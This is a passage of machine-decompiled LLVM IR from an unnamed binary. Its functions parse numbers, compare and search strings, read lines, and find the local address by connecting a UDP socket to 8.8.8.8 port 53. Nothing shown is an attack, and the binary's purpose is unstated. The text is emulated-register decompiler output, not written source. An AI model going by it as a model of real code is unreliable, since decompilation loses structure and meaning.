  %v1_12414 = add i32 %v0_12440, 1
  %v9_12418 = icmp eq i32 %v1_12414, %arg2
  br i1 %v9_12418, label %dec_label_pc_123f8, label %dec_label_pc_12420

dec_label_pc_12420:                               ; preds = %dec_label_pc_12414, %dec_label_pc_12408
  %v0_12440 = phi i32 [ %v1_12414, %dec_label_pc_12414 ], [ 0, %dec_label_pc_12408 ]
  %v1_12420 = phi i32 [ %v1_124203, %dec_label_pc_12414 ], [ 0, %dec_label_pc_12408 ]
  %v2_12420 = add i32 %v1_12420, %arg3
  %v3_12420 = inttoptr i32 %v2_12420 to i8*
  %v4_12420 = load i8, i8* %v3_12420, align 1
  %v2_12424 = add i32 %v0_12440, %arg1
  %v3_12424 = inttoptr i32 %v2_12424 to i8*
  %v4_12424 = load i8, i8* %v3_12424, align 1
  %v9_12428 = icmp eq i8 %v4_12424, %v4_12420
  br i1 %v9_12428, label %dec_label_pc_12434, label %bb

bb:                                               ; preds = %dec_label_pc_12420
  br label %dec_label_pc_12414

dec_label_pc_12434:                               ; preds = %dec_label_pc_12420
  %v1_12434 = add i32 %v1_12420, 1
  %v9_12438 = icmp eq i32 %v1_12434, %arg4
  br i1 %v9_12438, label %dec_label_pc_12440, label %dec_label_pc_12414

dec_label_pc_12440:                               ; preds = %dec_label_pc_12434
  %v1_12440 = add i32 %v0_12440, 1
  br label %dec_label_pc_123f8

; uselistorder directives
  uselistorder i32 %v1_12434, { 1, 0 }
  uselistorder i32 %v1_12420, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12414, { 1, 0 }
  uselistorder label %dec_label_pc_123f8, { 3, 0, 1, 2 }
}

define i32 @function_12448(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12448:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_12448 = load i32, i32* @r4, align 4
  %v6_12448 = load i32, i32* @r5, align 4
  %v12_12448 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %.thread, %dec_label_pc_1246c, %bb, %dec_label_pc_12448
  %v0_12458 = phi i32 [ %tmp, %dec_label_pc_12448 ], [ %v5_12458, %bb ], [ %v5_12458, %dec_label_pc_1246c ], [ %v5_12458, %.thread ]
  %v1_12458 = inttoptr i32 %v0_12458 to i8*
  %v2_12458 = load i8, i8* %v1_12458, align 1
  %v5_12458 = add i32 %v0_12458, 1
  store i32 %v5_12458, i32* @r5, align 4
  %v7_1245c = icmp eq i8 %v2_12458, 9
  br i1 %v7_1245c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12458
  br label %dec_label_pc_12458

bb:                                               ; preds = %dec_label_pc_12458
  %v3_12458 = zext i8 %v2_12458 to i32
  %v8_12460 = icmp eq i8 %v2_12458, 32
  store i32 %v3_12458, i32* @r4, align 4
  br i1 %v8_12460, label %dec_label_pc_12458, label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %bb
  %v7_1246c = icmp eq i8 %v2_12458, 10
  br i1 %v7_1246c, label %dec_label_pc_12458, label %dec_label_pc_12474

dec_label_pc_12474:                               ; preds = %dec_label_pc_1246c
  %v7_12474 = icmp eq i8 %v2_12458, 45
  br i1 %v7_12474, label %dec_label_pc_12564, label %dec_label_pc_1247c

dec_label_pc_1247c:                               ; preds = %dec_label_pc_12474
  %v7_1247c = icmp eq i8 %v2_12458, 43
  br i1 %v7_1247c, label %bb44, label %dec_label_pc_1248c

bb44:                                             ; preds = %dec_label_pc_1247c
  %v2_12480 = inttoptr i32 %v5_12458 to i8*
  %v3_12480 = load i8, i8* %v2_12480, align 1
  %v4_12480 = zext i8 %v3_12480 to i32
  store i32 %v4_12480, i32* @r4, align 4
  %v6_12480 = add i32 %v0_12458, 2
  store i32 %v6_12480, i32* @r5, align 4
  br label %dec_label_pc_1248c

dec_label_pc_1248c:                               ; preds = %bb44, %dec_label_pc_1247c, %dec_label_pc_12564
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_12564 ], [ 2147483647, %dec_label_pc_1247c ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_12564 ], [ 0, %dec_label_pc_1247c ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_12494 = call i32 @function_12a1c(i32 %storemerge1, i32 %arg2)
  %v0_12498 = load i32, i32* @r7, align 4
  store i32 %v0_12498, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_124a0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_124a0, i32* @r1, align 4
  %v0_124a4 = call i32 @function_12920()
  %v0_124b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_124b4.outer

dec_label_pc_124b4.outer:                         ; preds = %.thread5, %dec_label_pc_1248c
  %v2_12530.ph = phi i32 [ %v5_12530, %.thread5 ], [ 0, %dec_label_pc_1248c ]
  %v1_124f4.ph = phi i32 [ %v4_12534, %.thread5 ], [ %v0_124b4.pre, %dec_label_pc_1248c ]
  %v1_1250c.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_1248c ]
  %v3_12500 = icmp uge i32 %v2_12530.ph, %v0_124a4
  %v9_12500 = icmp eq i32 %v2_12530.ph, %v0_124a4
  %v2_12504 = xor i1 %v3_12500, true
  %v3_12504 = or i1 %v9_12500, %v2_12504
  %v2_12508 = xor i1 %v9_12500, true
  %v3_12508 = and i1 %v3_12500, %v2_12508
  %v2_12528 = icmp eq i1 %v9_12500, false
  br label %dec_label_pc_124b4

dec_label_pc_124b4:                               ; preds = %dec_label_pc_124b4.outer, %dec_label_pc_1253c
  %v1_1250c = phi i32 [ -1, %dec_label_pc_1253c ], [ %v1_1250c.ph, %dec_label_pc_124b4.outer ]
  %v1_124f4 = phi i32 [ %v3_1253c, %dec_label_pc_1253c ], [ %v1_124f4.ph, %dec_label_pc_124b4.outer ]
  %v1_124b4 = urem i32 %v1_124f4, 256
  %v1_124b8 = add nsw i32 %v1_124b4, -48
  %v1_124c0 = add nsw i32 %v1_124b4, -97
  %v1_124c4 = add i32 %v1_124f4, -48
  store i32 %v1_124c4, i32* @r2, align 4
  %v1_124c8 = add nsw i32 %v1_124b4, -65
  %tmp75 = icmp ult i32 %v1_124b8, 10
  br i1 %tmp75, label %dec_label_pc_124f8, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124b4
  %v2_124d0 = icmp ugt i32 %v1_124c8, 24
  %v7_124d0 = icmp eq i32 %v1_124c8, 25
  %v2_124d4 = xor i1 %v7_124d0, true
  %v3_124d4 = and i1 %v2_124d0, %v2_124d4
  br i1 %v3_124d4, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_124d0
  store i32 0, i32* @r2, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_124d0, %bb45
  %v0_124e814 = phi i32 [ %v1_124c4, %dec_label_pc_124d0 ], [ 0, %bb45 ]
  %v2_124d8 = xor i1 %v2_124d0, true
  %v3_124d8 = or i1 %v7_124d0, %v2_124d8
  br i1 %v3_124d8, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  store i32 1, i32* @r2, align 4
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_124e8 = phi i32 [ %v0_124e814, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_124d4, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_124e0 = icmp ugt i32 %v1_124c0, 24
  %v11_124e0 = icmp eq i32 %v1_124c0, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_124e4 = phi i1 [ %v7_124d0, %bb48 ], [ %v11_124e0, %bb49 ]
  %v0_124e4 = phi i1 [ %v2_124d0, %bb48 ], [ %v6_124e0, %bb49 ]
  %v2_124e4 = xor i1 %v1_124e4, true
  %v3_124e4 = and i1 %v0_124e4, %v2_124e4
  br i1 %v3_124e4, label %dec_label_pc_12548, label %dec_label_pc_124e8

dec_label_pc_124e8:                               ; preds = %bb50
  %v2_124e8 = icmp eq i32 %v0_124e8, 0
  %. = select i1 %v2_124e8, i32 87, i32 55
  %v2_124f4 = sub i32 %v1_124f4, %.
  store i32 %v2_124f4, i32* @r2, align 4
  br label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124b4, %dec_label_pc_124e8
  %v0_1250c29 = phi i32 [ %v1_124c8, %dec_label_pc_124b4 ], [ %., %dec_label_pc_124e8 ]
  %v3_12530 = phi i32 [ %v1_124c4, %dec_label_pc_124b4 ], [ %v2_124f4, %dec_label_pc_124e8 ]
  %v1_124f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_124f8 = sub i32 %v3_12530, %v1_124f8
  %v4_124f8 = xor i32 %v1_124f8, %v3_12530
  %v5_124f8 = xor i32 %v2_124f8, %v3_12530
  %v6_124f8 = and i32 %v5_124f8, %v4_124f8
  %v7_124f8 = icmp slt i32 %v6_124f8, 0
  %v8_124f8 = icmp slt i32 %v2_124f8, 0
  %v2_124fc = xor i1 %v8_124f8, %v7_124f8
  br i1 %v2_124fc, label %dec_label_pc_12500, label %dec_label_pc_12548

dec_label_pc_12500:                               ; preds = %dec_label_pc_124f8
  br i1 %v3_12504, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_12500
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_12500, %bb53
  %v0_1250c28 = phi i32 [ %v0_1250c29, %dec_label_pc_12500 ], [ 0, %bb53 ]
  br i1 %v3_12508, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_1250c = phi i32 [ %v0_1250c28, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_1250c, 0
  %v4_1250c = zext i1 %tmp76 to i32
  %v5_1250c = or i32 %v0_1250c, %v4_1250c
  %v7_1250c = icmp eq i32 %v5_1250c, 0
  br i1 %v7_1250c, label %dec_label_pc_12514, label %dec_label_pc_1253c

dec_label_pc_12514:                               ; preds = %bb56
  %v1_12520 = load i32, i32* %r8.global-to-local, align 4
  %v2_12520 = sub i32 %v3_12530, %v1_12520
  %v4_12520 = xor i32 %v1_12520, %v3_12530
  %v5_12520 = xor i32 %v2_12520, %v3_12530
  %v6_12520 = and i32 %v5_12520, %v4_12520
  %v7_12520 = icmp slt i32 %v6_12520, 0
  %v8_12520 = icmp slt i32 %v2_12520, 0
  %v9_12520 = icmp eq i32 %v3_12530, %v1_12520
  %v3_12524 = xor i1 %v8_12520, %v7_12520
  %v4_12524 = or i1 %v9_12520, %v3_12524
  br i1 %v4_12524, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_12514
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_12514
  br i1 %v2_12528, label %.thread5, label %dec_label_pc_1253c

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_12530 = mul i32 %v1_124f8, %v2_12530.ph
  %v5_12530 = add i32 %v4_12530, %v3_12530
  %v1_12534 = load i32, i32* @r5, align 4
  %v2_12534 = inttoptr i32 %v1_12534 to i8*
  %v3_12534 = load i8, i8* %v2_12534, align 1
  %v4_12534 = zext i8 %v3_12534 to i32
  %v6_12534 = add i32 %v1_12534, 1
  store i32 %v6_12534, i32* @r5, align 4
  br label %dec_label_pc_124b4.outer

dec_label_pc_1253c:                               ; preds = %thread-pre-split, %bb56
  %v0_1253c = load i32, i32* @r5, align 4
  %v1_1253c = inttoptr i32 %v0_1253c to i8*
  %v2_1253c = load i8, i8* %v1_1253c, align 1
  %v3_1253c = zext i8 %v2_1253c to i32
  %v5_1253c = add i32 %v0_1253c, 1
  store i32 %v5_1253c, i32* @r5, align 4
  br label %dec_label_pc_124b4

dec_label_pc_12548:                               ; preds = %dec_label_pc_124f8, %bb50
  %v1_12548 = icmp slt i32 %v1_1250c, 0
  %v0_12574 = load i32, i32* %sl.global-to-local, align 4
  %v2_12574 = icmp eq i32 %v0_12574, 0
  br i1 %v1_12548, label %dec_label_pc_12574, label %dec_label_pc_12550

dec_label_pc_12550:                               ; preds = %dec_label_pc_12548
  br i1 %v2_12574, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_12550
  %v2_12554 = sub i32 0, %v2_12530.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_12550, %bb59
  %v1_12560 = phi i32 [ -2147483648, %bb61 ], [ %v2_12530.ph, %dec_label_pc_12550 ], [ %v2_12554, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_12448, i32* @r4, align 4
  store i32 %v6_12448, i32* @r5, align 4
  store i32 %v12_12448, i32* @r7, align 4
  ret i32 %v1_12560

dec_label_pc_12564:                               ; preds = %dec_label_pc_12474
  %v1_12564 = inttoptr i32 %v5_12458 to i8*
  %v2_12564 = load i8, i8* %v1_12564, align 1
  %v3_12564 = zext i8 %v2_12564 to i32
  store i32 %v3_12564, i32* @r4, align 4
  %v5_12564 = add i32 %v0_12458, 2
  store i32 %v5_12564, i32* @r5, align 4
  br label %dec_label_pc_1248c

dec_label_pc_12574:                               ; preds = %dec_label_pc_12548
  br i1 %v2_12574, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_12574
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_12574
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_12574, { 1, 0 }
  uselistorder i32 %v2_12520, { 1, 0 }
  uselistorder i32 %v1_12520, { 1, 0, 2 }
  uselistorder i32 %v2_124f8, { 1, 0 }
  uselistorder i32 %v3_12530, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_124d0, { 1, 2, 0 }
  uselistorder i1 %v2_124d0, { 1, 0, 2 }
  uselistorder i32 %v1_124b4, { 1, 2, 0 }
  uselistorder i32 %v1_124f4, { 1, 2, 0 }
  uselistorder i32 %v1_1250c, { 1, 0 }
  uselistorder i1 %v9_12500, { 1, 0, 2 }
  uselistorder i1 %v3_12500, { 1, 0 }
  uselistorder i32 %v2_12530.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_124a4, { 1, 0 }
  uselistorder i32 %v5_12458, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_12458, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_12458, { 0, 1, 3, 2 }
  uselistorder i8 9, { 5, 0, 1, 4, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_124f8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_124b4, { 1, 0 }
  uselistorder label %dec_label_pc_1248c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12458, { 1, 2, 0, 3 }
}

define i32 @function_12584(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12584:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12584 = load i32, i32* @r4, align 4
  store i32 %v3_12584, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_125c0.dec_label_pc_1259c_crit_edge, %dec_label_pc_12584
  %v0_125a0 = phi i32 [ %v0_125a0.pre, %dec_label_pc_125c0.dec_label_pc_1259c_crit_edge ], [ %arg3, %dec_label_pc_12584 ]
  %v0_1259c = phi i32 [ %v5_125c0, %dec_label_pc_125c0.dec_label_pc_1259c_crit_edge ], [ %tmp, %dec_label_pc_12584 ]
  %v4_125a8 = call i32 @function_15b9c(i32 %v0_125a0, i32 %v0_1259c, i32 1)
  %v7_125ac = icmp eq i32 %v4_125a8, 1
  %v0_125b4 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_125ac, label %dec_label_pc_125b4, label %dec_label_pc_125cc

dec_label_pc_125b4:                               ; preds = %dec_label_pc_1259c
  %v1_125b4 = add i32 %v0_125b4, 1
  store i32 %v1_125b4, i32* %r5.global-to-local, align 4
  %v1_125b8 = load i32, i32* %r8.global-to-local, align 4
  %v6_125bc = icmp slt i32 %v1_125b4, %v1_125b8
  br i1 %v6_125bc, label %dec_label_pc_125c0, label %.loopexit

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125b4
  %v0_125c0 = load i32, i32* @r4, align 4
  %v1_125c0 = inttoptr i32 %v0_125c0 to i8*
  %v2_125c0 = load i8, i8* %v1_125c0, align 1
  %v5_125c0 = add i32 %v0_125c0, 1
  store i32 %v5_125c0, i32* @r4, align 4
  %v7_125c4 = icmp eq i8 %v2_125c0, 10
  br i1 %v7_125c4, label %dec_label_pc_125cc, label %dec_label_pc_125c0.dec_label_pc_1259c_crit_edge

dec_label_pc_125c0.dec_label_pc_1259c_crit_edge:  ; preds = %dec_label_pc_125c0
  %v0_125a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1259c

dec_label_pc_125cc:                               ; preds = %dec_label_pc_1259c, %dec_label_pc_125c0
  %v0_125cc = phi i32 [ %v1_125b4, %dec_label_pc_125c0 ], [ %v0_125b4, %dec_label_pc_1259c ]
  %v2_125cc = icmp eq i32 %v0_125cc, 0
  br i1 %v2_125cc, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_125cc
  store i32 0, i32* %r7.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_125b4, %dec_label_pc_125cc, %bb
  %v0_125d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_125d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_125d8, i32* @r4, align 4
  ret i32 %v0_125d4

; uselistorder directives
  uselistorder i32 %v5_125c0, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_15b9c, { 3, 1, 0, 2 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_125cc, { 1, 0 }
}

define i32 @function_125e0() local_unnamed_addr {
dec_label_pc_125e0:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_125e0 = load i32, i32* @r4, align 4
  %v6_125e0 = load i32, i32* @r5, align 4
  %v9_125e0 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_125f0 = call i32 @function_12ecc()
  store i32 0, i32* @r4, align 4
  %v2_125f8 = inttoptr i32 %v0_125f0 to i32*
  store i32 0, i32* %v2_125f8, align 4
  %v0_12604 = load i32, i32* @r4, align 4
  %v3_12608 = call i32 @function_14b54(i32 2, i32 2, i32 %v0_12604)
  %v7_1260c = icmp eq i32 %v3_12608, -1
  store i32 %v3_12608, i32* @r5, align 4
  br i1 %v7_1260c, label %bb, label %dec_label_pc_1261c

bb:                                               ; preds = %dec_label_pc_125e0
  %v1_12614 = load i32, i32* @r4, align 4
  br label %dec_label_pc_12674

dec_label_pc_1261c:                               ; preds = %dec_label_pc_125e0
  store i32 2, i32* %stack_var_-36, align 4
  %v1_12630 = call i32 @function_14828(i32 134744072)
  %v1_1263c = call i32 @function_1484c(i32 53)
  %v2_12640 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12640, i32* @r4, align 4
  %v0_12648 = load i32, i32* @r6, align 4
  %v0_12650 = load i32, i32* @r5, align 4
  %v3_12654 = call i32 @function_14798(i32 %v0_12650, i32 %v2_12640, i32 %v0_12648)
  %v2_1265c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_1265c, i32* @r2, align 4
  %v0_12660 = load i32, i32* @r5, align 4
  %v3_12664 = call i32 @function_147dc(i32 %v0_12660, i32 %v2_12640, i32 %v2_1265c)
  %v0_12668 = load i32, i32* @r5, align 4
  store i32 %v0_12668, i32* @r0, align 4
  %v1_1266c = call i32 @function_15b20(i32 %v0_12668)
  br label %dec_label_pc_12674

dec_label_pc_12674:                               ; preds = %bb, %dec_label_pc_1261c
  %storemerge = phi i32 [ %v1_12630, %dec_label_pc_1261c ], [ %v1_12614, %bb ]
  store i32 %v3_125e0, i32* @r4, align 4
  store i32 %v6_125e0, i32* @r5, align 4
  store i32 %v9_125e0, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_12608, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_14798, { 2, 8, 1, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32)* @function_1484c, { 9, 8, 7, 6, 2, 1, 5, 4, 91, 90, 89, 88, 87, 86, 85, 92, 84, 83, 82, 81, 80, 79, 78, 3, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 62, 61, 65, 64, 63, 60, 56, 55, 59, 58, 57, 54, 53, 52, 51, 46, 45, 50, 49, 48, 47, 44, 43, 39, 38, 42, 41, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 22, 21, 28, 27, 26, 25, 24, 23, 20, 19, 11, 10, 18, 17, 16, 15, 14, 13, 12, 0 }
  uselistorder i32 53, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_14828, { 3, 2, 1, 17, 18, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 (i32, i32, i32)* @function_14b54, { 4, 19, 1, 3, 18, 17, 2, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_12674, { 1, 0 }
}

define i32 @function_12680(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12680:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_12684 = load i8, i8* %tmp, align 1
  %v2_12688 = icmp eq i8 %v3_12684, 0
  br i1 %v2_12688, label %bb, label %dec_label_pc_1269c

bb:                                               ; preds = %dec_label_pc_12680
  %v4_12684 = zext i8 %v3_12684 to i32
  br label %dec_label_pc_126b0

dec_label_pc_1269c:                               ; preds = %dec_label_pc_12680
  br label %dec_label_pc_126a0

dec_label_pc_126a0:                               ; preds = %dec_label_pc_126a0, %dec_label_pc_1269c
  %v0_126a0 = phi i32 [ %v1_126a0, %dec_label_pc_126a0 ], [ 0, %dec_label_pc_1269c ]
  %v1_126a0 = add i32 %v0_126a0, 1
  %v2_126a4 = add i32 %v1_126a0, %arg2
  %v3_126a4 = inttoptr i32 %v2_126a4 to i8*
  %v4_126a4 = load i8, i8* %v3_126a4, align 1
  %v2_126a8 = icmp eq i8 %v4_126a4, 0
  br i1 %v2_126a8, label %dec_label_pc_126b0, label %dec_label_pc_126a0

dec_label_pc_126b0:                               ; preds = %dec_label_pc_126a0, %bb
  %v0_126f421 = phi i32 [ %v4_12684, %bb ], [ %v1_126a0, %dec_label_pc_126a0 ]
  store i32 0, i32* @r2, align 4
  %v0_126b82 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_126b82, 1
  br i1 %tmp29, label %dec_label_pc_12708, label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %dec_label_pc_126b0, %dec_label_pc_126b8.backedge
  %v0_126bc.in = phi i32 [ %v0_126bc, %dec_label_pc_126b8.backedge ], [ %v0_126b82, %dec_label_pc_126b0 ]
  %v1_126d0 = phi i32 [ %v1_126d015, %dec_label_pc_126b8.backedge ], [ 0, %dec_label_pc_126b0 ]
  %v0_126c4 = phi i32 [ %v5_126c4, %dec_label_pc_126b8.backedge ], [ %tmp23, %dec_label_pc_126b0 ]
  %v0_126bc = add i32 %v0_126bc.in, -1
  %v1_126c4 = inttoptr i32 %v0_126c4 to i8*
  %v2_126c4 = load i8, i8* %v1_126c4, align 1
  %v3_126c4 = zext i8 %v2_126c4 to i32
  store i32 %v3_126c4, i32* @ip, align 4
  %v5_126c4 = add i32 %v0_126c4, 1
  %v1_126c8 = add nsw i32 %v3_126c4, -65
  %v2_126d0 = add i32 %v1_126d0, %arg2
  %v3_126d0 = inttoptr i32 %v2_126d0 to i8*
  %v4_126d0 = load i8, i8* %v3_126d0, align 1
  %v6_126d0 = zext i8 %v4_126d0 to i32
  %v1_126d4 = add nsw i32 %v6_126d0, -65
  %tmp38 = icmp ult i32 %v1_126c8, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_126c4
  %v5_126d8 = or i32 %v3_126c4, 96
  store i32 %v5_126d8, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_126c4, %bb30
  %v0_126e4 = phi i32 [ %v3_126c4, %dec_label_pc_126c4 ], [ %v5_126d8, %bb30 ]
  %tmp39 = icmp ult i32 %v1_126d4, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_126e0 = or i32 %v6_126d0, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_126e4 = phi i32 [ %v6_126d0, %bb31 ], [ %v5_126e0, %bb32 ]
  %v9_126e4 = icmp eq i32 %v0_126e4, %v1_126e4
  br i1 %v9_126e4, label %dec_label_pc_126f0, label %bb34

bb34:                                             ; preds = %bb33
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_126b8.backedge

dec_label_pc_126b8.backedge:                      ; preds = %bb34, %dec_label_pc_126f0
  %v1_126d015 = phi i32 [ 0, %bb34 ], [ %v1_126f0, %dec_label_pc_126f0 ]
  %tmp35 = icmp slt i32 %v0_126bc, 1
  br i1 %tmp35, label %dec_label_pc_12708, label %dec_label_pc_126c4

dec_label_pc_126f0:                               ; preds = %bb33
  %v1_126f0 = add i32 %v1_126d0, 1
  store i32 %v1_126f0, i32* @r2, align 4
  %v9_126f4 = icmp eq i32 %v0_126f421, %v1_126f0
  br i1 %v9_126f4, label %dec_label_pc_126fc, label %dec_label_pc_126b8.backedge

dec_label_pc_126fc:                               ; preds = %dec_label_pc_126f0
  %v2_126fc = sub i32 %v5_126c4, %tmp23
  br label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_126b8.backedge, %dec_label_pc_126b0, %dec_label_pc_126fc
  %storemerge = phi i32 [ %v2_126fc, %dec_label_pc_126fc ], [ -1, %dec_label_pc_126b0 ], [ -1, %dec_label_pc_126b8.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_126f0, { 1, 2, 0 }
  uselistorder i32 %v0_126c4, { 1, 0 }
  uselistorder i32 %v1_126d0, { 1, 0 }
  uselistorder i8 %v3_12684, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_12708, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126b8.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_126c4, { 1, 0 }
}

define i32 @function_12710(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12710:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12710 = load i8, i8* %arg1, align 1
  %v2_12714 = icmp eq i8 %v2_12710, 0
  br i1 %v2_12714, label %bb, label %dec_label_pc_12720

bb:                                               ; preds = %dec_label_pc_12710
  %v3_12710 = zext i8 %v2_12710 to i32
  br label %dec_label_pc_12734

dec_label_pc_12720:                               ; preds = %dec_label_pc_12710
  br label %dec_label_pc_12724

dec_label_pc_12724:                               ; preds = %dec_label_pc_12724, %dec_label_pc_12720
  %v0_12724 = phi i32 [ %v1_12724, %dec_label_pc_12724 ], [ 0, %dec_label_pc_12720 ]
  %v1_12724 = add i32 %v0_12724, 1
  %v2_12728 = add i32 %v1_12724, %tmp
  %v3_12728 = inttoptr i32 %v2_12728 to i8*
  %v4_12728 = load i8, i8* %v3_12728, align 1
  %v2_1272c = icmp eq i8 %v4_12728, 0
  br i1 %v2_1272c, label %dec_label_pc_12734, label %dec_label_pc_12724

dec_label_pc_12734:                               ; preds = %dec_label_pc_12724, %bb
  %v0_127803 = phi i32 [ %v3_12710, %bb ], [ %v1_12724, %dec_label_pc_12724 ]
  %v1_12734 = inttoptr i32 %arg2 to i8*
  %v2_12734 = load i8, i8* %v1_12734, align 1
  %v3_12734 = zext i8 %v2_12734 to i32
  %v2_12738 = icmp eq i8 %v2_12734, 0
  br i1 %v2_12738, label %bb21, label %dec_label_pc_12744

bb21:                                             ; preds = %dec_label_pc_12734
  store i32 %v3_12734, i32* @r2, align 4
  br label %dec_label_pc_12758

dec_label_pc_12744:                               ; preds = %dec_label_pc_12734
  br label %dec_label_pc_12748

